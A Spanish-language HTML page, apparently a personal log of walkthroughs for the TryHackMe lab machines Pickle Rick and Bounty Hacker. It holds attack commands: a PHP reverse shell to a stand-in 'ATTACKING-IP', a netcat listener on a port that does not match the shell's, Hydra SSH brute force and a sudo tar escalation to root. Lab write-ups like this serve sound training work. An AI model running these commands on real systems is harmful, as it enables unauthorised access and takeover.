<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro de Máquinas Virtuales TryHackMe</title>
    <meta name="description" content="Registro de Máquinas Virtuales TryHackMe. Encuentra códigos aprendidos, scripts útiles, comandos útiles y más.">
    <!-- Enlace al archivo CSS -->
    <link href="https://fonts.googleapis.com/css2?family=Protest+Guerrilla&family=Poppins:wght@400;700&family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="tryhackme.css">
</head>
<body>

    <div class="banner">
        <h1>Registro de Máquinas Virtuales TryHackMe</h1>
        <!-- Agrega un banner principal con tu nombre o un logo -->
        <!-- Por ejemplo: <img src="banner.png" alt="Banner" class="image"> -->
    </div>
    <div class="container">
        <div class="column">
                      
    <h2 onclick="toggleDetails('maquinas-resueltas')">Máquinas Virtuales Resueltas</h2>
            <div id="maquinas-resueltas" class="details">
    
    <div id="rick-pepinillo">
        <h3 onclick="toggleDetails('rick-pepinillo-details')">Rick Pepinillo</h3>
        <div id="rick-pepinillo-details" class="details">
            <img src="https://i.imgur.com/dJHO6eS.jpg" alt="Rick Pepinillo" class="image">
            <!-- Guía paso a paso -->
            <h4 onclick="toggleDetails('pasoo-1')">Paso 1: Verificar la Conectividad y el TTL</h4>
            <div id="pasoo-1" class="details">
                <p>Antes de comenzar cualquier actividad de escaneo, es crucial verificar la conectividad con la máquina víctima y obtener información básica sobre ella, como el TTL (Time To Live) en la respuesta del ping.</p>
                <p class="prompt">ping -c 1 &lt;ipmaquina&gt;</p>
                <p>Este comando envía un solo paquete de ping a la dirección IP especificada. Observa el TTL en la respuesta del ping para obtener información adicional sobre la máquina.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-2')">Paso 2: Escaneo Inicial con Nmap</h4>
            <div id="pasoo-2" class="details">
                <p>El siguiente paso es realizar un escaneo inicial de puertos en la máquina utilizando la herramienta Nmap. Este escaneo proporcionará información sobre los puertos abiertos y los servicios en ejecución en la máquina víctima.</p>
                <p class="prompt">nmap -A &lt;ipmaquina&gt; -oN nmap_picklerick_inicial</p>
                <p>Este comando ejecuta un escaneo detallado de todos los puertos abiertos en la máquina y guarda los resultados en un archivo llamado "nmap_picklerick_inicial". El parámetro -A activa la detección de versiones y la detección de servicios.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-3')">Paso 3: Inspeccionar Directorios con Gobuster</h4>
            <div id="pasoo-3" class="details">
                <p>Para descubrir posibles directorios ocultos o archivos en la web de la máquina, utilizaremos la herramienta Gobuster. Esto nos permitirá obtener más información sobre la estructura del sitio web y encontrar posibles puntos de entrada.</p>
                <p class="prompt">gobuster -u http://&lt;ipmaquina&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py</p>
                <p>Este comando realiza un escaneo utilizando una lista de palabras clave contenida en el archivo "directory-list-2.3-medium.txt". La herramienta buscará archivos con las extensiones especificadas.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-4')">Paso 4: Acceder a Archivos Encontrados y Realizar Inyección de Comandos</h4>
            <div id="pasoo-4" class="details">
                <p>Después de realizar el escaneo con Gobuster, es posible que hayas encontrado archivos como "robots.txt" y "login.php". Accede a estos archivos utilizando un navegador web o herramientas como curl o wget. Si encuentras una posible contraseña en alguno de los archivos, tómala nota y guárdala en tu archivo de datos para referencia futura.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-5')">Paso 5: Realizar un Shell Inverso</h4>
            <div id="pasoo-5" class="details">
                <p>Si has identificado un punto de inyección de comandos en la máquina, puedes aprovecharlo para establecer un shell inverso. Esto te proporcionará acceso a la máquina víctima desde tu máquina de ataque.</p>
                <p class="prompt">php -r '$sock=fsockopen("ATTACKING-IP",4444);exec("/bin/sh -i <&4 >&4 2>&4");'</p>
                <p>Este comando abrirá una conexión de red hacia tu máquina y ejecutará un shell interactivo en la máquina víctima.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-6')">Paso 6: Escuchar el Shell Inverso</h4>
            <div id="pasoo-6" class="details">
                <p>En tu máquina de ataque, abre un programa como Netcat para escuchar la conexión de shell inverso.</p>
                <p class="prompt">nc -nvlp 1234</p>
                <p>Esto abrirá una escucha en el puerto 1234 para recibir la conexión de shell inverso desde la máquina víctima.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-7')">Paso 7: Elevar los Privilegios a Root</h4>
            <div id="pasoo-7" class="details">
                <p>Una vez dentro de la máquina víctima a través del shell inverso, ejecuta el siguiente comando para ver las opciones de sudo disponibles.</p>
                <p class="prompt">sudo -l</p>
                <p>Esto mostrará las opciones de sudo disponibles para el usuario actual. En este caso, se encontró una elevación de privilegios con Perl y el archivo backup.pl.</p>
                <p class="prompt">cat backup.pl</p>
                <p>Este comando mostrará el contenido del archivo backup.pl y nos permitirá comprender mejor cómo podemos aprovecharlo para elevar nuestros privilegios.</p>
            </div>
            <h4 onclick="toggleDetails('pasoo-8')">Paso 8: Búsqueda de Ingredientes</h4>
            <div id="pasoo-8" class="details">
                <p>Como usuario root en la máquina víctima, realiza una búsqueda de los tres ingredientes necesarios en los directorios relevantes utilizando comandos como find o grep. Esto nos permitirá completar el objetivo de la máquina virtual.</p>
                <p class="prompt">find / -name "Salsa verde" 2&gt;/dev/null</p>
                <p class="prompt">find / -name "Jugo de pepinillos" 2&gt;/dev/null</p>
                <p class="prompt">find / -name "Morty Jue" 2&gt;/dev/null</p>
                <p>Estos comandos buscarán los ingredientes en todo el sistema de archivos y nos proporcionarán las ubicaciones donde se encuentran.</p>
            </div>
    </div>
    <div id="Bounty-Hacker">
        <h3 onclick="toggleDetails('bounty-hacker-details')">Bounty Hacker</h3>
        <div id="bounty-hacker-details" class="details">
            <img src="https://i.imgur.com/wSThKd7.jpg" alt="Bounty-Hacker" class="image">
            <h4 onclick="toggleDetails('Bounty-Hacker-Paso1')">Paso 1: Escaneo inicial</h4>
            <div id="Bounty-Hacker-Paso1" class="details">
                <p>Identificar la dirección IP de la máquina víctima:</p>
                <pre><code>ping &lt;IP&gt;</code></pre>
                <p>Este comando envía un paquete de prueba a la dirección IP especificada y espera una respuesta. Nos ayuda a verificar la conectividad y la disponibilidad de la máquina.</p>

                <!-- Más detalles del paso 1 -->
    </div>

    <h4 onclick="toggleDetails('Bounty-Hacker-Paso2')">Paso 2: Enumeración y acceso inicial</h4>
    <div id="Bounty-Hacker-Paso2" class="details">
        <p>Exploración del servicio HTTP (puerto 80):</p>
        <pre><code>curl http://&lt;IP&gt;</code></pre>
        <p>Curl es una herramienta de línea de comandos que se utiliza para transferir datos desde o hacia un servidor. En este caso, lo utilizamos para acceder al servicio web HTTP y obtener información sobre la página.</p>
        
        <p>Acceso al servicio FTP (puerto 21):</p>
        <pre><code>ftp &lt;IP&gt;</code></pre>
        <p>Este comando inicia una sesión FTP con la máquina remota. Nos permite conectarnos al servicio FTP y explorar archivos en el servidor.</p>
    </div>
    
    <!-- Paso 3 -->
    <h4 onclick="toggleDetails('Bounty-Hacker-Paso3')">Paso 3: Obtención de información y credenciales</h4>
    <div id="Bounty-Hacker-Paso3" class="details">
        <p>Exfiltración de archivos desde el servicio FTP:</p>
        <pre><code>get logs.txt</code></pre>
        <pre><code>get task.txt</code></pre>
        <p>Estos comandos descargan los archivos logs.txt y task.txt desde el servidor FTP a nuestra máquina local.</p>
        
        <p>Análisis de archivos descargados:</p>
        <p>Utiliza cat o un editor de texto para revisar los archivos descargados y extraer información relevante, como posibles contraseñas o pistas.</p>
    </div>
    
    <!-- Paso 4 -->
    <h4 onclick="toggleDetails('Bounty-Hacker-Paso4')">Paso 4: Explotación de credenciales</h4>
    <div id="Bounty-Hacker-Paso4" class="details">
        <p>Fuerza bruta contra SSH (puerto 22):</p>
        <pre><code>hydra -l link -P logs.txt ssh://&lt;IP&gt;</code></pre>
        <p>hydra: Esta es una herramienta de fuerza bruta que puede realizar ataques contra varios servicios, como SSH, FTP, etc.</p>
        <p>-l link: Especifica el nombre de usuario a utilizar en el ataque de fuerza bruta.</p>
        <p>-P logs.txt: Especifica el archivo que contiene la lista de contraseñas que se probarán en el ataque.</p>
    </div>
    
    <!-- Paso 5 -->
    <h4 onclick="toggleDetails('Bounty-Hacker-Paso5')">Paso 5: Escalada de privilegios</h4>
    <div id="Bounty-Hacker-Paso5" class="details">
        <p>Revisión de permisos Sudo:</p>
        <pre><code>sudo -l</code></pre>
        <p>Este comando muestra los privilegios sudo asignados al usuario actual en la máquina remota. Nos ayuda a identificar si tenemos permisos especiales que pueden ser explotados para obtener acceso de root.</p>
        
        <p>Explotación de binario Sudo:</p>
        <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
        <p>sudo tar: Utilizamos tar con el permiso sudo para crear un archivo tar vacío.</p>
        <p>--checkpoint=1: Esta opción le indica a tar que ejecute el comando especificado después de cada archivo archivado.</p>
        <p>--checkpoint-action=exec=/bin/sh: Esta opción ejecuta /bin/sh (una shell) después de cada archivo archivado, proporcionándonos acceso a una shell interactiva con privilegios de root.</p>
    </div>
    
    <!-- Paso 6 -->
    <h4 onclick="toggleDetails('Bounty-Hacker-Paso6')">Paso 6: Recolección de flags</h4>
    <div id="Bounty-Hacker-Paso6" class="details">
        <p>Recuperación de la flag de usuario y root:</p>
        <p>Utiliza cat u otro comando para leer y recuperar el contenido de las flags.</p>
    </div>
</div>
                <!-- Agrega más máquinas virtuales resueltas aquí -->
            </div>
        </div>
    </div>

    <div class="social-icons">
        <!-- Agrega enlaces a tus redes sociales o proyectos relacionados -->
        <!-- Por ejemplo: -->
        <!-- <a href="https://twitter.com/tu_usuario" target="_blank"><img src="twitter_icon.png" alt="Twitter"></a> -->
        <!-- <a href="https://github.com/tu_usuario" target="_blank"><img src="github_icon.png" alt="GitHub"></a> -->
        <a href="https://github.com/sirpeca" target="_blank" class="github-link"><img src="https://i.imgur.com/7h8z7D2.jpg" alt="GitHub"></a>

    </div>

    <script>
        function toggleDetails(id) {
            var details = document.getElementById(id);
            if (details.style.display === "none") {
                details.style.display = "block";
            } else {
                details.style.display = "none";
            }
        }
    </script>
    <link rel="icon" href="favicon.ico" type="image/x-icon"> <!-- Agrega el favicon.ico en la raíz de tu proyecto -->
</body>
</html>
